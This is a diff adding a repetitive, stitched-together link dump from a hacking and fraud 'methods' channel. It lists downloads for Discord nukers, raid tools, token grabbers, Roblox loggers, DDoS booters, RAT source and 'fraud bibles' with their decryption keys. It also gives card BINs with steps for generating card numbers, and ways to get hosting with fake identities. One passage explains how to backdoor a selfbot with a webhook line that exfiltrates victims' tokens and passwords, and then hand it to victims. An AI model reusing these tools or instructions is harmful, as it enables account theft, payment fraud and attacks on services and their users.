@@ -1,0 +1,1098 @@
+83 AC NUKER | https://boost.ink/y9pzs
+MASS DM BOT | https://boost.ink/pne4m
+SERVER LEAVER | https://boost.ink/-v7jj
+TNO SELFBOT | https://boost.ink/2q-tx
+8300 NUKER | https://boost.ink/h-44m
+VENOM NUKER | https://boost.ink/quop
+BLADE ANTI | https://boost.ink/ppo0
+ARIEL NUKER|https://boost.ink/h0mt
+FREIND MASSDM EMBED|https://boost.ink/6ebo61
+BLEED NUKER|https://boost.ink/9w7zzd
+DARK TOOLS|https://boost.ink/wa5rx
+ARTIC TOOLS | https://boost.ink/c_mo
+ALPHA SPAMMER|https://boost.ink/2b6-6x
+SERVER STEAL | https://boost.ink/_60t
+https://cdn.discordapp.com/attachments/852933997691535413/852935683148611595/Force_the_Venom.rar
+https://cdn.discordapp.com/attachments/852933997691535413/852935753171730432/meth.rar
+https://cdn.discordapp.com/attachments/852933997691535413/852935698679988284/message_1.txt
+Attachment file type: unknown
+Q_Vibes_Ultimite_Plus_Non-Obfuscated.rbxl
+643.82 KB
+https://mega.nz/folder/ukJGkY7J
+HUGE HACK PACK!
+13.1 GB folder on MEGA
+52 files
+
+Decryption key = VUxjkwb5FiN8UlScN5v0VA
+https://mega.nz/folder/KQhFVShY#
+HACKPACK 2 LEAKED
+1.32 GB folder on MEGA
+18 files
+
+Decryption Key= VDvPFg4OeD_-uycyIh7afg
+https://replit.com/@trymato34/TwitchFollowers-6#index.js
+go to line 107
+and put channel id
+line 7 to 14 role ids and your id
+line 247 bot token
+press node index
+in shell
+https://cdn.discordapp.com/attachments/851394273895120926/851394426797555722/twitch_follower_bot.rar
+also the file
+just setup
+and press on install.bat
+then run.bat
+
+https://replit.com/@trymato34/TwitchFollowers-6#index.js
+sorry i forgot after you did setup type npm i in shell
+after it is done type node index and it should work
+https://cdn.discordapp.com/attachments/851394580065550357/851394608319168512/Op_token_grabber.rar
+you need py for this
+first edit the py and go to
+Clear()
+    requests.post('yourwebhook',json={'content': f"Token: {toe}\nPassword: {password}Username: {Arsky.user.name}"})
+    startprint()
+it is line 3180
+put there your webhook
+and save
+after that you are done send it to someone that wants a self bot
+tell them to go to config.js and put their token (pass is optimal)
+say them to press on install.bat and now you should get their token
+The op thing is that the self bot is working perfect
+
+if they don't want to download send them this
+https://replit.com/@trymato34/ScaryGranularCache#3Hunna.py
+https://replit.com/@trymato34/khoot-bot-by-sean#index.js
+Make first a acc on repl.it
+After that press on the link and press fork
+After that press on start and here u go
+1k bots in 1min
+----------------------------------------------------------------------------------------------------
+Discord Token Logger: https://cdn.discordapp.com/attachments/846070184396980244/846071050130554880/Token_Logga_Beasts_Cookies.rar
+Discord Nuker: https://cdn.discordapp.com/attachments/846070184396980244/846071172852219904/Discord_Nuker_BC.rar
+Discord Nuker2:  https://cdn.discordapp.com/attachments/653519497717874688/724449200791879720/nuker.py
+Discord raid tool:  https://up-to-down.net/164988/RaidBot
+Discord SPAM tool: https://file-link.net/164988/SpamTool
+Discord Token Generator: https://cdn.discordapp.com/attachments/736947541433778226/736979011590422568/NiNj4HAX-Token-Generator.exe
+Discord Nitro Sniper: https://link-to.net/164988/NitroSniper
+Discord Nitro Sniper2: https://link-to.net/164988/NitroSniper
+Inf Robux Method: https://cdn.discordapp.com/attachments/846065995626053675/848561202833522728/Inf_Robux_Method.txt
+King Leo Method: https://cdn.discordapp.com/attachments/846065995626053675/848577763458940988/King_Leo_Method.txt
+Working Stub: https://cdn.discordapp.com/attachments/846070184396980244/848577887996870676/Depression.zip
+Limited Sniper: https://cdn.discordapp.com/attachments/846070184396980244/848577993240215562/LimitedOrItem_Sniper.zip
+Group Scraper: https://cdn.discordapp.com/attachments/846070184396980244/848578086957088768/roblox-group-scraper-main.zip
+Triplehook methods: https://cdn.discordapp.com/attachments/846070184396980244/848578246181126144/Triplehooking.txt
+4x-Hooked Logger: https://cdn.discordapp.com/attachments/846070184396980244/848578379682545684/4x.rar
+Dualhook RbxFlip: https://cdn.discordapp.com/attachments/846065995626053675/848560695095459850/RbxFlip.zip
+Roblox Loggers/methods: https://cdn.discordapp.com/attachments/846065995626053675/848578793248391208/ROBLOX_LOGGERS_METHODS_Beasts_Cookies.zip
+DDOS Tools:
+ https://github.com/lancremastered/Lanc-Remastered
+https://github.com/HLoTW/OpMinneapolis
+https://github.com/LimerBoy/Impulse
+https://github.com/C0nw0nk/Nginx-Lua-Anti-DDoS
+https://github.com/Stephin-Franklin/DDos-Attack
+https://github.com/blackhatethicalhacking/DDoS-Layer7-bheh
+https://github.com/EH30/byte-ddos
+https://github.com/thehackingsage/DDoS
+https://github.com/abriginets/wreckuests
+https://anonfiles.com/5d6fh3H2pd/Soccers_Booter_1_exe
+https://anonfiles.com/7f68hdH4p8/-SpitFire_DoS_Tool_exe
+https://anonfiles.com/9568hfH8pd/stub_exe
+https://anonfiles.com/Bd6ahaH9p6/udp_flood_exe
+https://anonfiles.com/F467heHfp6/udpflood_exe
+https://anonfiles.com/H262hfH6p4/UDP_Flooder_By_FKN_exe
+https://anonfiles.com/N863h5H4pa/WicKds_Booter_v3.1_exe
+https://anonfiles.com/Pd6ch0Hep1/WinNuker_exe
+https://anonfiles.com/Ra6dh1H2pc/XOIC_exe
+https://anonfiles.com/V563hcH5p1/Website_Crasher_v4.7_exe
+https://anonfiles.com/Xb61h6H4pe/TechDoS_exe
+https://anonfiles.com/Z264haH9p4/WarFlood_exe
+https://anonfiles.com/b67ch4H0p2/Ac1d-She11s_exe
+https://anonfiles.com/d37bh7H5p4/_FuCk_It_DOS_exe
+https://anonfiles.com/f977h0Hcpc/360Booter_GBooter_XBL_exe
+Carding Methods: https://cdn.discordapp.com/attachments/715359844416356422/715376337031790592/Full-Karding-Tut-2020.txt
+Netflix Account Generator: https://anonfiles.com/VbIe41e2o4/Netflix_Account_Generator_exe
+Netflix Premium Account Generator: https://anonfile.com/q3E3U5t9b4/NetFlix_Premium_Account_Generator_zip
+Netflix Premium Account Generator2:https://anonfiles.com/z1E8Gdhdo4/Netflix_Premium_Account_Generator_zip
+pubg mod: https://www.happymod.com/pubg-mobile-mod/com.tencent.ig/com.mod.pubg-mobile-v0-14-0-much-money.html
+minecraft mod: https://www.happymod.com/minecraft-pocket-edition-apk-mod/com.mojang.minecraftpe/com.mod.download-minecraft-pocket-edition-mod-premium-skins-v1-16-100-57.html
+ COC mod: https://www.happymod.com/clash-of-clans-apk-mod/com.supercell.clashofclans/com.mod.clash-of-clans-mod-v-13-0-13-unlimited-gemsgold-elixir.html
+among us mod: https://cdn.discordapp.com/attachments/757608714315497605/758463972428349490/Among.Us.v2020.9.9s_3.zip
+PUBG MOBILE - Traverse Mod apk download - Tencent Games PUBG MOBILE...
+PUBG MOBILE - Traverse Mod: 100% working on 76,975 devices, voted by 50, developed by Tencent Games. Mod menu note: suggest use guest mode, or you will be banned. ..
+----------------------------------------------------------------------------------------------------
+Discord Nuker: https://cdn.discordapp.com/attachments/848521429695987723/848521609194242098/Discord_Nuker_BC.rar
+Discord raid tool:  https://up-to-down.net/164988/RaidBot
+Discord raid tool2: https://cdn.discordapp.com/attachments/653519497717874688/725065290513383555/Raid-Tool-Box.rar
+Discord Spam Tool: https://cdn.discordapp.com/attachments/653519497717874688/725065290513383555/Raid-Tool-Box.rar
+Discord Spam Tool2:https://cdn.discordapp.com/attachments/710206457685082112/712083404606275624/DiscordSpammer.rar
+Discord Nitro Generator: https://replit.com/@BENKOFKOF/Nitro-Generator-Checker
+Discord Webhook spammer: https://rbxstock.shop/mass/
+Discord Token Checker: https://cdn.discordapp.com/attachments/736947541433778226/736983072372949072/Token.Checker.rar
+repl.it
+BENKOFKOF
+Nitro-Generator-Checker
+This is a nitro generator that was made with python. Generates and checks Classic and Booster.
+
+Dualhook RbxFlip: https://cdn.discordapp.com/attachments/846065995626053675/848560695095459850/RbxFlip.zip
+Quad-Hooked logger: https://cdn.discordapp.com/attachments/846065995626053675/848561068732317696/4x_1.rar
+Inf Robux: https://cdn.discordapp.com/attachments/846065995626053675/848561202833522728/Inf_Robux_Method.txt
+Other Roblox Loggers/Methods: https://cdn.discordapp.com/attachments/846065995626053675/848561838605074442/Roblox_Methods_and_Loggers_BEASTS_COOKIES.rar
+----------------------------------------------------------------------------------------------------
+5 Fraud Bibles: 
+https://mega.nz/folder/CI9lwYQa#L_pv_Ul8iLKiaHX_inpP0A/folder/WMFTnSQJ
+https://mega.nz/folder/jhwGmTzB#z9ZLYY6j6jopVmseDxt55g/folder/voIlAaQb
+https://mega.nz/folder/KQhFVShY#VDvPFg4OeD_-uycyIh7afg
+https://mega.nz/folder/82ZBwA5S#oBWw3E--sbuLDo6YNASIQw
+https://mega.nz/folder/BzhGHCAY#oyD9xyrYGJGE-vYTpZ6LuA
+33.21 GB folder on MEGA
+9779 files and 320 subfolders
+
+DDOS Tools: 
+https://github.com/lancremastered/Lanc-Remastered
+https://github.com/HLoTW/OpMinneapolis
+https://github.com/LimerBoy/Impulse
+https://github.com/C0nw0nk/Nginx-Lua-Anti-DDoS
+https://github.com/Stephin-Franklin/DDos-Attack
+https://github.com/blackhatethicalhacking/DDoS-Layer7-bheh
+https://github.com/EH30/byte-ddos
+https://github.com/thehackingsage/DDoS
+https://github.com/abriginets/wreckuests
+https://anonfiles.com/5d6fh3H2pd/Soccers_Booter_1_exe
+https://anonfiles.com/7f68hdH4p8/-SpitFire_DoS_Tool_exe
+https://anonfiles.com/9568hfH8pd/stub_exe
+https://anonfiles.com/Bd6ahaH9p6/udp_flood_exe
+https://anonfiles.com/F467heHfp6/udpflood_exe
+https://anonfiles.com/H262hfH6p4/UDP_Flooder_By_FKN_exe
+https://anonfiles.com/N863h5H4pa/WicKds_Booter_v3.1_exe
+https://anonfiles.com/Pd6ch0Hep1/WinNuker_exe
+https://anonfiles.com/Ra6dh1H2pc/XOIC_exe
+https://anonfiles.com/V563hcH5p1/Website_Crasher_v4.7_exe
+https://anonfiles.com/Xb61h6H4pe/TechDoS_exe
+https://anonfiles.com/Z264haH9p4/WarFlood_exe
+https://anonfiles.com/b67ch4H0p2/Ac1d-She11s_exe
+https://anonfiles.com/d37bh7H5p4/_FuCk_It_DOS_exe
+https://anonfiles.com/f977h0Hcpc/360Booter_GBooter_XBL_exe
+
+yt view bot - https://cdn.discordapp.com/attachments/792672975832350721/792673082085998612/Youtube_Viewer.rar
+Tik Tok Like Bot: https://www.mytoolstown.com/
+TIKTOK FOLLOW BOT     -https://direct-link.net/164988/TiktoFollowers
+Steam Key Generator:  https://up-to-down.net/164988/SteamKey
+Google Play Gift Card Generator: https://github.com/Oafu1337/Google-Play-Gen/archive/master.zip
+----------------------------------------------------------------------------------------------------
+FOR THE ACCOUNT GENERATORS YOU NEED ( Java Runtime environment)
+Account Generator: https://anonfile.com/74s389j5oa/Account_Generator_exe 
+Discord Account Generator: https://anonfiles.com/icX4Yfpdb7/Discord_Account_Generator_zip
+Discord Account Generator2: https://anonfiles.com/bfCdf7aep3/Discord_Account_Generator_by_Lrd_rar
+Fortnite Account Generator: https://anonfiles.com/bcz8F45en6/Fortnite_Account_Generator_By_Zhard_rar
+HeadSpace Account Generator: https://anonfiles.com/NeadLdA6o5/Headspace_Acc_Generator_zip
+Minecraft Account Generator: https://anonfiles.com/df74R0kbo7/Minecraft_Account_Generator_rar
+Netflix Account Generator: https://anonfiles.com/VbIe41e2o4/Netflix_Account_Generator_exe
+Netflix Premium Account Generator: https://anonfile.com/q3E3U5t9b4/NetFlix_Premium_Account_Generator_zip
+Netflix Premium Account Generator2:https://anonfiles.com/z1E8Gdhdo4/Netflix_Premium_Account_Generator_zip
+pubg mod: https://www.happymod.com/pubg-mobile-mod/com.tencent.ig/com.mod.pubg-mobile-v0-14-0-much-money.html
+minecraft mod: https://www.happymod.com/minecraft-pocket-edition-apk-mod/com.mojang.minecraftpe/com.mod.download-minecraft-pocket-edition-mod-premium-skins-v1-16-100-57.html
+ COC mod: https://www.happymod.com/clash-of-clans-apk-mod/com.supercell.clashofclans/com.mod.clash-of-clans-mod-v-13-0-13-unlimited-gemsgold-elixir.html
+among us mod: https://cdn.discordapp.com/attachments/757608714315497605/758463972428349490/Among.Us.v2020.9.9s_3.zip
+Here are your perks ma nigga
+---------------------------------------------------------
+YOUTUBE VIEWBOT       -  https://up-to-down.net/164988/Viewbot1
+NITRO GEN                          - https://link-to.net/164988/Nitro
+NITRO CHECKER               -  https://link-to.net/164988/NitroChecker
+NITRO SNIPER                    -  https://link-to.net/164988/NitroSniper
+DISCORD RAID TOOL      -  https://up-to-down.net/164988/RaidBot
+DISCORD NUKER - https://cdn.discordapp.com/attachments/653519497717874688/724449200791879720/nuker.py 
+DISCORD SPAM TOOL    -  https://file-link.net/164988/SpamTool
+DISCORD TOKEN GENERATOR - https://cdn.discordapp.com/attachments/736947541433778226/736979011590422568/NiNj4HAX-Token-Generator.exe
+DISCORD NUKER               - https://cdn.discordapp.com/attachments/846070184396980244/846071172852219904/Discord_Nuker_BC.rar
+TIKTOK LIKE BOT/VIEWBOT    - https://file-link.net/164988/TikTok
+TIKTOK FOLLOW BOT     -https://direct-link.net/164988/TiktoFollowers
+FRAUD BIBLE 1 - https://mega.nz/folder/CI9lwYQa#L_pv_Ul8iLKiaHX_inpP0A/folder/WMFTnSQJ
+FRAUD BIBLE 2 - https://mega.nz/folder/jhwGmTzB#z9ZLYY6j6jopVmseDxt55g/folder/voIlAaQb
+FRAUD BIBLE  3 - https://mega.nz/folder/KQhFVShY#VDvPFg4OeD_-uycyIh7afg
+FRAUD BIBLE 4- https://mega.nz/folder/82ZBwA5S#oBWw3E--sbuLDo6YNASIQw
+FRAUD BIBLE 5 -https://mega.nz/folder/BzhGHCAY#oyD9xyrYGJGE-vYTpZ6LuA
+GOOGLE PLAY GIFT CARD GEN  - https://github.com/Oafu1337/Google-Play-Gen/archive/master.zip
+DDOS Scripts - https://anonfiles.com/Vf56haEboa/slavic_zip | Password : stresser.vip'
+STEAM KEY GEN   - https://up-to-down.net/164988/SteamKey
+UNLIMITED GMAIL ACCOUNTS METHOD    - https://direct-link.net/164988/Freegmailaccounts
+RAT Source Code : https://mega.nz/folder/mPBSQSiA#dC9YLMyOZVk72orABAwl0A
+REST OF THE METHODS: https://mega.nz/folder/3vJljSIK#tnSUlSFAyruBj-Jk6rbOjw/folder/q7ZXiQRL
+4x Logger ROBLOX https://cdn.discordapp.com/attachments/846065995626053675/847876008446263396/4x.rar
+
+Lot's of DDoS Tools (From exe)https://github.com/lancremastered/Lanc-Remasteredhttps://github.com/HLoTW/OpMinneapolishttps://github.com/LimerBoy/Impulsehttps://github.com/C0nw0nk/Nginx-Lua-Anti-DDoShttps://github.com/Stephin-Franklin/DDos-Attackhttps://github.com/blackhatethicalhacking/DDoS-Layer7-bhehhttps://github.com/EH30/byte-ddoshttps://github.com/thehackingsage/DDoShttps://github.com/abriginets/wreckuestshttps://anonfiles.com/5d6fh3H2pd/Soccers_Booter_1_exehttps://anonfiles.com/7f68hdH4p8/-SpitFire_DoS_Tool_exehttps://anonfiles.com/9568hfH8pd/stub_exehttps://anonfiles.com/Bd6ahaH9p6/udp_flood_exehttps://anonfiles.com/F467heHfp6/udpflood_exehttps://anonfiles.com/H262hfH6p4/UDP_Flooder_By_FKN_exehttps://anonfiles.com/N863h5H4pa/WicKds_Booter_v3.1_exehttps://anonfiles.com/Pd6ch0Hep1/WinNuker_exehttps://anonfiles.com/Ra6dh1H2pc/XOIC_exehttps://anonfiles.com/V563hcH5p1/Website_Crasher_v4.7_exehttps://anonfiles.com/Xb61h6H4pe/TechDoS_exehttps://anonfiles.com/Z264haH9p4/WarFlood_exehttps://anonfiles.com/b67ch4H0p2/Ac1d-She11s_exehttps://anonfiles.com/d37bh7H5p4/_FuCk_It_DOS_exehttps://anonfiles.com/f977h0Hcpc/360Booter_GBooter_XBL_exe
+-----------------------------------------------------------------
+
+Free Domain & SSL & Hosting
+
+FREE DOMAIN
+http://www.dot.tk/en/index.html?lang=en
+https://www.freenom.com/en/index.html?lang=en
+
+FREE HOSTING
+https://infinityfree.net/
+https://www.freehosting.com/
+
+FREE SSL
+https://www.sslforfree.com/
+https://zerossl.com/
+https://letsencrypt.org/
+PayPal Credit Card Bins
+
+===>
+Bins : 
+515462003166xxxx
+515462001140xxxx
+515462005152xxxx
+Date: 04/30/2020
+
+
+Address : 
+Street: Stone St
+City: New York
+State: New York
+Zip Code: 10004
+Number Format: 996xxxxxxx
+Ip Usa :flag_us:
+===>
+
+Spotfiy Premium BIN
+
+==>
+BIN:406068
+IP:USA
+ZIP: 10004
+==>
+
+FAQ : How to use the bins? / how to get CC from bins?
+
+Answer : 
+
+- Place to Generate using bins : https://namso-gen.com/
+- Copy the Bin and Paste in Bin area.
+- Set Amount as much as you want.
+- Click Generate.
+- And use where-ever you want.
+
+Paypal Antilimited 
+
+1. Install any VPN and connect to Canada. I recommend (Urban VPN)
+2. Clear your history and all of the cookies.
+3. Make a Canadian PayPal account using a proper address, use this: https://fake-it.ws/ca/
+4. Verify the email and make sure to use a Canadian phone number.
+Free Alternatives for the phone number: 
+Install on your phone the app called Talkaton or TextNow, both worked pretty well for me. I had to use a VPN on my phone number to make those apps worked, one called ThunderVPN.
+Paid Alternatives for the phone number:
+https://smspva.com/ or any other SMS Verification Service. - costs around 0.5$, more or less.
+NamsoGen
+NamsoGen Random Test Credit Card Numbers Generator
+NamsoGen random test credit card numbers generator based on your own BIN pattern.
+ᐅ Canada Fake Name | Address |  Credit Card | Generator
+Canada Fake Generator / Calculator for: Names ✅ Addresses ✅ Credit Cards ✅ IBAN Number ✅ Fake Mail ✅ Username ✅ Password ✅ and more ✅ real algorithms ✅
+Account activations via SMS for any services
+Virtual numbers for account activations via SMS. SMS for any services:Facebook-0,1$ Gmail-0,1$ Instagram-0,1$ Microsoft,Bing,Hotmail-0,03$ Twitter-0,05$ Steam-0,1$ Uber-0,1$
+
+Instagram Followers 
+
+- https://klastakipci.com/
+- 20 Free Followers a Day
+
+
+Method for Google Drive STORAGE Reeeee
+
+1. go to https://td.fastio.me/
+2. Write a random storage name
+3. Write your google mail adress
+4. Select a random CH
+
+>>>> ENJOY MOTHERFUCKERRRRRRR <<<<
+
+
+FREE RDP METHOD!! !!! REEEEEEEEE
+
+METHOD 1: 
+1 : GO AND SIGNUP ON THIS WEBSITE : DIGITALOCEAN (MAKE SURE TO USE THIS LINK FOR FREE TRIAL)
+2 : AFTER SIGNING UP YOU WILL GET 100$ FREE TRIAL BUT TO ACTIVATE IT YOU NEED TO ADD A CC (DON'T ADD PAYPAL)
+3 : SO ADD YOUR OWN CC OR GET A FREE VCC FROM HERE (YOUR CC WON'T BE CHARGED IT'S JUST FOR VERIFICATION PURPOSES)
+4 : IF YOU USE YOUR OWN CC YOUR ALL GOOD AND IF YOU NEED VCC JUST SIGNUP ON THE APP MENTIONED ABOVE VERIFY YOUR PHONE NUMBER AND VOILA YOU HAVE A VCC READY TO USE FOR YOUR RDP FOR FREE !
+5 : ONCE YOU HAVE ADDED CC TO DIGITALOCEAN SIMPLY CLICK THIS LINK FOR STEPS TO GET YOUR OWN FREE WINDOWS RDP !
+
+METHOD 2~~
+
+ 1. Go To Any TempMail Services Such: https://smailpro.com/ 
+2. Grab Fake Email & Go To http://ericom.com/ 
+3. Enter Fake - Random Details & Enter The Temp Email
+4. Now Click On Virtual Desktop & Complete Captcha
+5. Done! You Got Your Free RDP.
+SMAIL PRO | Temp mail - Temp Gmail - Disposable Fake Email
+Temp Mail? Forget it, try Temp Gmail now. Protect yourself from spam, malware and trade user information by using disposable email or fake email of SMAILPRO
+Ericom Software | Zero Trust Browser Isolation & Secure Access
+Zero Trust Browser Isolation & Zero Trust Network Access cloud solutions that block all web and phishing malware targeting users, applications, and data
+########################### 7 Methods FOR RDP ################################
+
+Method 1:
+Following Sites Provide Free VPS:
+http://vpswala.org/
+http://ohosti.com/vpshosting.php
+https://gratisvps.net/
+https://my.letscloud.io/sign-up/
+https://developer.rackspace.com/
+https://www.vultr.com/
+https://www.cloudsigma.com/
+https://www.digitalocean.com/
+http://ezywatch.com/freevps/
+https://yellowcircle.net/
+https://www.ctl.io/free-trial/
+https://www.ihor.ru/
+https://www.neuprime.com/l_vds3.php
+https://www.apponfly.com/en/
+https://www.skysilk.com/
+https://sadd.io/
+
+Method 2:
+Enter https://vps.apponfly.com/
+Press F12 and open Network
+Follow these Images: https://imgur.com/a/JgnUYqc
+
+Method: 3
+Requirements: - Google account - Credit Card (Can use Yandex VCC)
+
+1. Go to Google Cloud | https://cloud.google.com/free/
+2. Register and fill out all the details. Cool, Now you have 300$ free in a VPS which you can have 32 cores on, etc. enjoy)
+
+
+Method 4:
+Go to: https://turbo.net/
+Now Register an account: Select Program you want to use (Preferably Google Chrome) Enjoy Free RDP!
+ 
+Method 5:
+Get a Lifetime Free VPS:
+1. Order the 'BackupHD Classic Free' euserv.com/en/cloud/reinforcement HD-free.php
+2. Log in into client board and check if the contract has been made.
+3. Wait until the contract has been handled (this take a few hours). You will get an email when it's done.
+4. Click on select behind your contract
+5. Click on Innovation and Test-Center in the left menu
+6. Click on Requested Participation behind CBCI closed Betatest
+7. Wait for your contract has been handled (this can take few-hours). Presently you can install your server through customer panel, and you have a little backup space as well.
+Free VPS Hosting No Credit Card Required For Trial Hosting On Windo...
+Get Best Free VPS Hosting Server (Windows, Linux) upto 1 GB RAM, 10 GB SSD Space, 1 TB Bandwidth in 1 Minute for $0.00/month for First 15 days On Trial. Simple, fast, scalable SSD cloud virtual server, No ADS No Credit Card Required.
+Free VPS Server | 6 Months Trial | Windows & Linux OS
+LetsCloud
+LetsCloud - Cloud computing with SSD and high performance Worldwide
+Everything to give you the best performance and get you closer to your customers.
+
+Method 6:
+Get a Free VPS/RDP under 5 Minutes:
+1. Go to serveroffer.lt and peruse their site for one moment or so until you get a message like this https://gyazo.com/c4...b2a6f5b77cc9d68 2. Answer them pleasantly.
+3. They will ask you on what bundle you need
+4. Pick one of their services, like VDS-10 It's excessive; I think VDS-3 or VDS-4 if possible
+5. Attempt with different servers on the off chance that you need
+6. They will likewise request an account, simply make it with fake data (fake info)
+7. They will also get some information about the OS, pick a Debian 9 since Windows commits to have an OS running and it's a waste of resources
+8. You will get your server info in your email
+
+Method 7:
+First, open the following Link and Sign Up to get your $10 credit. (For non-ref interface - > https://www.digitalocean.com/[This does not give you $10 credit] While filling your billing details, click on "Have a Promo Code?" at the bottom of the page. Enter any of the Promo codes to get additional credit: DOPRODUCT15 (Get $15 FREE) From the first step, you will get your first $10 credit, and by utilizing extra promotion codes, you can get up to $35 of all-out credits. Note: Some codes give more credit on higher plans. Note: If your code doesn't work at that point open a ticket and your issue ought to be solved. For Creditcard - > Utilize a VCC with low an incentive inside (For check), the rest you can utilize fakenamegenerator to fill in the details. Multi-month VPS = $5 So you'll get 5 months VPS Method 9: 1. Go to https://dash.hokoclo...login/#/register 2. Register and Confirm account from your email. 3. Go to the VPS segment - FREE VPS 4. Select Rule One - Rule One 5. Select the free plan 6. Select the Desired Server. 7. Your FREE VPS is Ready From Collection of all these Free VPS/RDP Sources. Few may not work depending on altering their TOS with time.
+-----------------------------------------------------------------
+YOUTUBE VIEWBOT       -  https://up-to-down.net/164988/Viewbot1
+NITRO GEN                          - https://link-to.net/164988/Nitro
+NITRO CHECKER               -  https://link-to.net/164988/NitroChecker
+NITRO SNIPER                    -  https://link-to.net/164988/NitroSniper
+DISCORD RAID TOOL      -  https://up-to-down.net/164988/RaidBot
+DISCORD SPAM TOOL    -  https://file-link.net/164988/SpamTool
+TIKTOK LIKE BOT/VIEWBOT    - https://file-link.net/164988/TikTok
+TIKTOK FOLLOW BOT     -https://direct-link.net/164988/TiktoFollowers
+-----------------------------------------------------------------
+EBAY CARDING METHOD    - https://link-to.net/164988/EbayMethod
+FREE HOSTING:
+https://infinityfree.net/
+https://www.freehosting.com/
+MULTIPACK   - https://up-to-down.net/164988/MultiPack
+-----------------------------------------------------------------
+METHOD FOR FREE GOGOLE DRIVE STORAGE
+ 
+1. go to https://td.fastio.me/
+2. Write a random storage name
+3. Write your google mail adress
+4. Select a random CH
+
+4K NORDVPN ACCOUNTS   -https://file-link.net/164988/300NordVPN
+STEAM KEY GEN   - https://up-to-down.net/164988/SteamKey
+PREMIUM ACCOUNTS GENERATOR   - https://generator.spotifycentral.store/
+GOOGLE PLAY GIFT CARD GEN    - https://github.com/Oafu1337/Google-Play-Gen/archive/master.zip
+UNLIMITED GMAIL ACCOUNTS METHOD    - https://direct-link.net/164988/Freegmailaccounts
+ -----------------------------------------------------------------
+
+● Fraud Bible 2020 Link - https://mega.nz/folder/CwxjhLbT#VKc3T2NduWqeyEd5E5SUMQ 
+ 
+● Fraud Bible 2019 Link - https://mega.nz/folder/O0ZRyQpb#xpT_rBTvNfCzo7y9CILY1g 
+ 
+● Fraud Bible 2019 Link 2 - https://mega.nz/#F!O0ZRyQpb 
+decryption key: xpT_rBTvNfCzo7y9CILY1g
+ 
+● 2020 Jig Bible - https://mega.nz/folder/bRMCiYQQ/folder/fN1RGLha 
+decryption key: z26_9ZJLIccbYOaOtA7gzA
+ 
+● Jigs Bible V2 - https://mega.nz/file/m5hABCTZ#469FICOO_5R2KUNrRy_HjicT7Xovwk4QpEaWpQec2Ho
+ 
+● Methods Bible -
+https://mega.nz/folder/2NJ0VYwK#c4mRJPR3CcC4BKB4DQbO5Q
+-----------------------------------------------------------------
+
+Free Domain & SSL & Hosting
+
+FREE DOMAIN
+http://www.dot.tk/en/index.html?lang=en
+https://www.freenom.com/en/index.html?lang=en
+FREE HOSTING
+https://infinityfree.net/
+https://www.freehosting.com/
+
+FREE SSL
+https://www.sslforfree.com/
+https://zerossl.com/
+https://letsencrypt.org/
+
+
+
+
+PayPal Credit Card Bins
+
+===>
+Bins : 
+515462003166xxxx
+515462001140xxxx
+515462005152xxxx
+Date: 04/30/2020
+
+
+Address : 
+Street: Stone St
+City: New York
+State: New York
+Zip Code: 10004
+Number Format: 996xxxxxxx
+Ip Usa :flag_us:
+===>
+
+Spotfiy Premium BIN
+
+==>
+BIN:406068
+IP:USA
+ZIP: 10004
+==>
+
+FAQ : How to use the bins? / how to get CC from bins?
+
+Answer : 
+
+- Place to Generate using bins : https://namso-gen.com/
+- Copy the Bin and Paste in Bin area.
+- Set Amount as much as you want.
+- Click Generate.
+- And use where-ever you want.
+
+Paypal Antilimited 
+
+1. Install any VPN and connect to Canada. I recommend (Urban VPN)
+2. Clear your history and all of the cookies.
+3. Make a Canadian PayPal account using a proper address, use this: https://fake-it.ws/ca/
+4. Verify the email and make sure to use a Canadian phone number.
+Free Alternatives for the phone number: 
+Install on your phone the app called Talkaton or TextNow, both worked pretty well for me. I had to use a VPN on my phone number to make those apps worked, one called ThunderVPN.
+Paid Alternatives for the phone number:
+https://smspva.com/ or any other SMS Verification Service. - costs around 0.5$, more or less.
+InfinityFree
+Free and Unlimited Web Hosting with PHP and MySQL
+Free Web Hosting with Unlimited Disk Space, Unlimited Bandwidth and Unlimited Websites from InfinityFree. With PHP and MySQL and no forced ads on your site.
+Free Hosting - host without cost
+We provide free web hosting with control panel, PHP, MySQL. Free plan includes FTP, online site builder, apps installer, unmetered bandwidth, 100% uptime.
+SSL For Free - Free SSL Certificates in Minutes
+Free SSL certificates issued in less than a minute, for one or multiple domains, supporting wildcards and ACME with tutorials.
+Free SSL Certificates and SSL Tools - ZeroSSL
+Free SSL certificates issued instantly online, supporting ACME clients, SSL monitoring, quick validation and automated SSL renewal via ZeroSSL Bot or REST API.
+Let's Encrypt
+Let's Encrypt is a free, automated, and open certificate authority brought to you by the nonprofit Internet Security Research Group (ISRG).
+
+Instagram Followers 
+
+- https://klastakipci.com/
+- 20 Free Followers a Day
+
+
+Method for Google Drive STORAGE Reeeee
+
+1. go to https://td.fastio.me/
+2. Write a random storage name
+3. Write your google mail adress
+4. Select a random CH
+
+>>>> ENJOY MOTHERFUCKERRRRRRR <<<<
+
+
+FREE RDP METHOD!! !!! REEEEEEEEE
+
+METHOD 1: 
+1 : GO AND SIGNUP ON THIS WEBSITE : DIGITALOCEAN (MAKE SURE TO USE THIS LINK FOR FREE TRIAL)
+2 : AFTER SIGNING UP YOU WILL GET 100$ FREE TRIAL BUT TO ACTIVATE IT YOU NEED TO ADD A CC (DON'T ADD PAYPAL)
+3 : SO ADD YOUR OWN CC OR GET A FREE VCC FROM HERE (YOUR CC WON'T BE CHARGED IT'S JUST FOR VERIFICATION PURPOSES)
+4 : IF YOU USE YOUR OWN CC YOUR ALL GOOD AND IF YOU NEED VCC JUST SIGNUP ON THE APP MENTIONED ABOVE VERIFY YOUR PHONE NUMBER AND VOILA YOU HAVE A VCC READY TO USE FOR YOUR RDP FOR FREE !
+5 : ONCE YOU HAVE ADDED CC TO DIGITALOCEAN SIMPLY CLICK THIS LINK FOR STEPS TO GET YOUR OWN FREE WINDOWS RDP !
+
+METHOD 2~~
+
+ 1. Go To Any TempMail Services Such: https://smailpro.com/ 
+2. Grab Fake Email & Go To http://ericom.com/ 
+3. Enter Fake - Random Details & Enter The Temp Email
+4. Now Click On Virtual Desktop & Complete Captcha
+5. Done! You Got Your Free RDP.
+
+
+########################### 7 Methods FOR RDP ################################
+
+Method 1:
+Following Sites Provide Free VPS:
+http://vpswala.org/
+http://ohosti.com/vpshosting.php
+https://gratisvps.net/
+https://my.letscloud.io/sign-up/
+https://developer.rackspace.com/
+https://www.vultr.com/
+https://www.cloudsigma.com/
+https://www.digitalocean.com/
+http://ezywatch.com/freevps/
+https://yellowcircle.net/
+https://www.ctl.io/free-trial/
+https://www.ihor.ru/
+https://www.neuprime.com/l_vds3.php
+https://www.apponfly.com/en/
+https://www.skysilk.com/
+https://sadd.io/
+
